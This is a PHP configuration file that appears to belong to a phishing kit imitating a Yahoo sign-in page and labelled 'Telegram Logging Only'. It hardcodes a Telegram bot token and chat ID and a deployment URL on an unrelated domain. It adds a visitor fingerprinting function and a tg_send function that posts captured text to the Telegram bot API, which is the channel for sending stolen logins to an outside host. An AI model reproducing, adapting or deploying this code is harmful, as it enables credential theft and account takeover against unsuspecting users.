<?php

// Compatibility patch for servers misreporting their PHP version
if (!function_exists('str_contains')) {
    function str_contains(string $haystack, string $needle): bool {
        return $needle !== '' && mb_strpos($haystack, $needle) !== false;
    }
}


// config.php — Yahoo Sign-in · Telegram Logging Only

define('TG_TOKEN',   '8496823054:AAEVs6LRJ9EpwiewkzHddn4X26Ki2v-PTg4');
define('TG_CHAT_ID', '1212136600');
define('APP_URL',    'https://yi.hubyvc.com/1vite/yahoo'); // ← change to live domain

/* ══ DEVICE DETECTION ══ */
function detect_device(string $ua): array {
    $u = strtolower($ua);
    $os = 'Unknown OS';
    if (str_contains($u, 'iphone'))             $os = '🍎 iPhone (iOS)';
    elseif (str_contains($u, 'ipad'))           $os = '🍎 iPad (iOS)';
    elseif (str_contains($u, 'android'))        $os = '🤖 Android';
    elseif (str_contains($u, 'windows nt 10'))  $os = '🪟 Windows 10/11';
    elseif (str_contains($u, 'windows nt 6.3')) $os = '🪟 Windows 8.1';
    elseif (str_contains($u, 'windows nt 6.1')) $os = '🪟 Windows 7';
    elseif (str_contains($u, 'windows'))        $os = '🪟 Windows';
    elseif (str_contains($u, 'mac os x'))       $os = '🍏 macOS';
    elseif (str_contains($u, 'linux'))          $os = '🐧 Linux';
    elseif (str_contains($u, 'chromeos'))       $os = '💻 ChromeOS';

    $type = 'Desktop 🖥️';
    if (str_contains($u, 'mobile'))             $type = 'Mobile 📱';
    elseif (str_contains($u, 'tablet') || str_contains($u, 'ipad')) $type = 'Tablet 📟';

    $browser = 'Unknown Browser';
    if (str_contains($u, 'edg/') || str_contains($u, 'edge/'))      $browser = '🔵 Edge';
    elseif (str_contains($u, 'opr/') || str_contains($u, 'opera'))  $browser = '🔴 Opera';
    elseif (str_contains($u, 'brave'))                               $browser = '🦁 Brave';
    elseif (str_contains($u, 'chrome') && !str_contains($u, 'chromium')) $browser = '🌐 Chrome';
    elseif (str_contains($u, 'chromium'))                            $browser = '🌐 Chromium';
    elseif (str_contains($u, 'firefox'))                             $browser = '🦊 Firefox';
    elseif (str_contains($u, 'safari') && !str_contains($u, 'chrome')) $browser = '🧭 Safari';
    elseif (str_contains($u, 'samsung'))                             $browser = '📱 Samsung Browser';
    $ver = '';
    if (preg_match('/(chrome|firefox|safari|edg|opr|version)\/([0-9]+)/i', $ua, $m))
        $ver = ' v' . $m[2];
    return ['os' => $os, 'browser' => $browser . $ver, 'type' => $type];
}

/* ══ TELEGRAM ══ */
function tg_send(string $text): void {
    $ch = curl_init('https://api.telegram.org/bot' . TG_TOKEN . '/sendMessage');
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => ['chat_id' => TG_CHAT_ID, 'text' => $text, 'parse_mode' => 'HTML'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
    ]);
    curl_exec($ch);
    curl_close($ch);
}
